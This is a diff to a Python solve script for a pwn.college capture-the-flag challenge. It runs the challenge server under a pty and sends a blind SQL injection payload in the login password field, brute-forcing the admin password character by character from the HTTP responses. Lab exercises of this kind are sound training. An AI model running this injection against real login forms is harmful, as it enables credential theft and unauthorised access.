@@ -95,7 +95,10 @@ j = 0
 guess = None
 flag = "pwn.college{"
 pat0 = re.compile(r".*Press CTRL.*\n")
-r1, w1 = os.pipe()
+# we use a pty to change the python subprocess stdout buffering to line buffered
+# otherwise pythons default buffering would be used, which would write server prints
+# in batches making it hard to link them to the respective requests to the server.
+mfd, sfd = os.openpty()
 pid = os.fork()
 
 if pid == -1:
@@ -103,21 +106,20 @@ if pid == -1:
 	exit(1)
 
 if pid == 0:
-	os.close(r1)
+	os.close(mfd)
 
-	os.dup2(w1, 1)
-	os.close(w1)
-
-	# stdout as stderr
-	os.dup2(1, 2)
+	os.dup2(sfd, 0)
+	os.dup2(sfd, 1)
+	os.dup2(sfd, 2)
+	os.close(sfd)
 
 	os.execv("/challenge/server", ["/challenge/server"])
 	print("Error execv.", file=sys.stderr)
 	exit(1)
 
-os.close(w1)
+os.close(sfd)
 
-read_file = os.fdopen(r1, "r")
+read_file = os.fdopen(mfd, "r")
 
 # check server running
 while True:
@@ -127,18 +129,6 @@ while True:
 	m = pat0.match(line)
 	if m:
 		break
-# read server output in background to prevent buffered stdout from clogging pipe and freezing server
-# we have to do it this way, since we can not override the stdout buffering mode for
-# the subprocess python script and hence the print(f"DEBUG: {query=}") breaks the server
-pid = os.fork()
-
-if pid == -1:
-	print("Error fork.", file=sys.stderr)
-	exit(1)
-
-if pid == 0:
-	while True:
-		print(read_file.readline())
 
 while True:
 	guess = flag + alphabet[j]
@@ -147,6 +137,9 @@ while True:
 	data = {"username": "admin", "password": f'" OR (SELECT substr(password,1,{len(guess)}) FROM users WHERE username = "admin") = "{guess}" --'}
 	print(data["password"])
 	resp = requests.post(url, data=data, allow_redirects=False)
+	# clear stdout to prevent server freeze
+	print(read_file.readline())
+	print(read_file.readline())
 
 	if resp.status_code == 403:
 		print(f"{guess} {j} 403")
